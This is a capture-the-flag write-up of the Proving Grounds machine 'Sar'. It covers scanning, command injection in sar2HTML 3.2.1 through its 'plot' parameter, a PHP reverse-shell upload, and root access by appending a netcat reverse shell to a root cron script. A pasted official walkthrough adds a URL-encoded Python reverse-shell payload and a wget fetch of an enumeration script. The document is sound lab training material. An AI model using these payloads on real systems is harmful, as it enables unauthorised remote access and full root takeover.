---
title: sar
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sar]
└─$ sudo nmap -Pn -p- -sSCV -A -oN full_tcp-scan.txt --open 192.168.149.35
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-17 09:27 +0900
Nmap scan report for 192.168.149.35
Host is up (0.30s latency).
Not shown: 65509 closed tcp ports (reset), 24 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   301.24 ms 192.168.45.1
2   301.19 ms 192.168.45.254
3   301.12 ms 192.168.251.1
4   301.39 ms 192.168.149.35

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.47 seconds
                                                                
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sar]
└─$ whatweb -a 3 http://192.168.149.35 
http://192.168.149.35 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.149.35], Title[Apache2 Ubuntu Default Page: It works]
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sar]
└─$ feroxbuster \
-u http://192.168.149.35 \
-w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.149.35/
 🚩  In-Scope Url          │ 192.168.149.35
 🚀  Threads               │ 25
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 💢  Status Code Filters   │ [403, 404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 💲  Extensions            │ [html, git, php, txt, bak, zip, old]
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 2
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      375l      964w    10918c http://192.168.149.35/
200      GET      375l      964w    10918c http://192.168.149.35/index.html
200      GET        1l        1w        9c http://192.168.149.35/robots.txt
200      GET     1170l     5905w    95834c http://192.168.149.35/phpinfo.php
[#############>------] - 69m   333778/498312  61m     found:4       errors:27     
[####################] - 2h    498312/498312  0s      found:4       errors:189    
[####################] - 2h    498256/498256  80/s    http://192.168.149.35/
```

http://192.168.149.35/robots.txt

![](../../../assets/images/Pasted%20image%2020260517093736.png)

http://192.168.149.35/sar2HTML/

![](../../../assets/images/Pasted%20image%2020260517093822.png)
sar2html Ver 3.2.1

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sar]
└─$ searchsploit  sar2html           
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                     | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                         | php/webapps/47204.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

## test

![](../../../assets/images/Pasted%20image%2020260517113552.png)

---

# Initial Access

## Upload php-reverse-shell


![](../../../assets/images/Pasted%20image%2020260517153346.png)


```zsh
Command => pwd 
HPUX
Linux
SunOS
/var/www/html/sar2HTML
```

```zsh
Command => ls sarDATA/uPLOAD
HPUX
Linux
SunOS
php-reverse-shell.php
```

http://192.168.143.35/sar2HTML/sarDATA/uPLOAD/php-reverse-shell.php

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sar]
└─$ rlwrap -cAr nc -lvnp 80  
listening on [any] 80 ...
connect to [192.168.45.240] from (UNKNOWN) [192.168.143.35] 53132
Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 12:02:58 up  3:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

---

# Privilege Escalation

```zsh
Command => cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
```

## finally.sh is

```bash
$ cat /var/www/html/finally.sh
#!/bin/sh                                                                                                           
                                                                                                                    
./write.sh
```

## write.sh is

```zsh
Command => cat /var/www/html/write.sh
#!/bin/sh
touch /tmp/gateway
```

```zsh
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.240 1234 >/tmp/f"  >> /var/www/html/write.sh
$ cat /var/www/html/write.sh
#!/bin/sh

touch /tmp/gateway
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.240 1234 >/tmp/f
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Sar]
└─$ rlwrap -cAr nc -lvnp 1234 
listening on [any] 1234 ...
connect to [192.168.45.240] from (UNKNOWN) [192.168.143.35] 45956
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
92cac66f0a9aaced7dc4b48de4133954
# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:ab:98:b2 brd ff:ff:ff:ff:ff:ff
    inet 192.168.143.35/24 brd 192.168.143.255 scope global noprefixroute ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::760f:d636:b857:84d8/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

---



```zsh
Walkthrough
Close
Exploitation Guide for Sar
Summary
This machine is exploited via remote code execution in a vulnerable version of sar2html. We discover the vulnerable application by inspecting the robots.txt file. Once we've obtained an initial shell, we inspect and exploit a custom .sh file in order to obtain root privileges.

Enumeration
Nmap
We start off by running an nmap scan against the top 5000 TCP ports:

kali@kali:~$ nmap -p- -T4 --top-ports=5000 192.168.211.35
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-13 20:10 SAST
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 8.76% done; ETC: 20:12 (0:01:55 remaining)
Warning: 192.168.211.35 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.211.35
Host is up (0.25s latency).
Not shown: 4989 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
249/tcp   filtered unknown
388/tcp   filtered unidata-ldm
1023/tcp  filtered netvenuechat
1406/tcp  filtered netlabs-lm
1630/tcp  filtered oraclenet8cman
1818/tcp  filtered etftp
9290/tcp  filtered unknown
20226/tcp filtered unknown
58838/tcp filtered unknown
GoBuster
We find Apache running on port 80 and initiate gobuster to locate any public files or folders on the server.

kali@kali:~$ gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 10 --url http://192.168.211.35/      
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.211.35/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/13 20:23:22 Starting gobuster
===============================================================
GoBuster finds robots.txt and using curl we can quickly retrieve the contents of the file:

kali@kali:~$ curl http://192.168.211.35/robots.txt
Robots.txt points us to /sar2HTML directory. Visiting the full URL in our browser, we're able to identify the version of the sar2HTML application: 3.2.1. Using Searchsploit, we query Exploit-DB for any known vulnerabilities.

kali@kali:~$ searchsploit sar2html
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                          |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Sar2HTML 3.2.1 - Remote Command Execution                                                                                                                               | php/webapps/47204.txt

Exploitation
sar2HTML Remote Code Execution
First, we will set up our netcat listener on port 443:

kali@kali:~$ sudo nc -lvp 443
listening on [any] 443 ...
We're going to be using Python3 for our reverse shell. We need to modify the IP address and port information to match your setup:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.211",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
It's always a good idea to first URL-encode our payload:

%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%32%31%31%22%2c%34%34%33%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
With our URL-encoded payload and using our browser we visit the vulnerable page:

192.168.211.35/sar2HTML/index.php?plot=;%70%79%74%68%6f%6e%33%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%39%32%2e%31%36%38%2e%34%39%2e%32%31%31%22%2c%34%34%33%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27
Once executed, we receive a reverse shell back.

kali@kali:~$ sudo nc -lvp 443
listening on [any] 443 ...
192.168.211.35: inverse host lookup failed: Unknown host
connect to [192.168.49.211] from (UNKNOWN) [192.168.211.35] 47406
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@sar:/var/www/html/sar2HTML$ 
Escalation
Local Enumeration
Our first task is to get a Linux privilege escalation script onto our target machine. We will use linenum.sh for this target, hosting the checker script on our attacking machine using Python's SimpleHTTP server, and then and retrieving it using wget from the target machine.

kali@kali:~$ python -m SimpleHTTPServer 8000
Serving HTTP on 0.0.0.0 port 8000 ...
www-data@sar:/var/www/html/sar2HTML$ cd /tmp
cd /tmp
www-data@sar:/tmp$ wget http://192.168.118.3:8000/linenum.sh
wget http://192.168.118.3:8000/linenum.sh
--2020-03-10 18:03:38--  http://192.168.118.3:8000/linenum.sh
Connecting to 192.168.118.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 46631 (46K) [text/x-sh]
Saving to: 'linenum.sh'

linenum.sh          100%[===================>]  45.54K  --.-KB/s    in 0.08s   

2020-03-10 18:03:38 (576 KB/s) - 'linenum.sh' saved [46631/46631]
Once we have the privilege checker script on our target machine, we need to change the permissions to ensure that the script is executable. Then, we can run the script:

www-data@sar:/tmp$ chmod 777 linenum.sh
chmod 777 linenum.sh
www-data@sar:/tmp$ ./linenum.sh
Exploring the results of the linux enumeration script, we see that a cronjob runs a script finally.sh every 5 minutes as root:

...
[-] Crontab contents:
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
...
Root Shell
By inspecting finally.sh, we see that it runs another file called write.sh, which creates a file in the /tmp directory:

www-data@sar:/var/www/html$ cat finally.sh
cat finally.sh
#!/bin/sh

./write.sh
www-data@sar:/var/www/html$ cat write.sh
cat write.sh
#!/bin/sh

touch /tmp/gateway
www-data@sar:/var/www/html$
We can simply replace the contents of write.sh with our payload to obtain a root shell:

www-data@sar:/var/www/html$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.3 4444 >/tmp/f" > write.sh
<h -i 2>&1|nc 192.168.118.3 4444 >/tmp/f" > write.sh
www-data@sar:/var/www/html$ cat write.sh
cat write.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.3 4444 >/tmp/f
www-data@sar:/var/www/html$
Let's set up a netcat listener on port 4444 and catch the root shell:

kali@kali:~$ nc -lvp 4444
listening on [any] 4444 ...

192.168.211.35: inverse host lookup failed: Unknown host
connect to [192.168.49.211] from (UNKNOWN) [192.168.211.35] 43572
/bin/sh: 0: can't access tty; job control turned off
# # whoami
root
# 
```
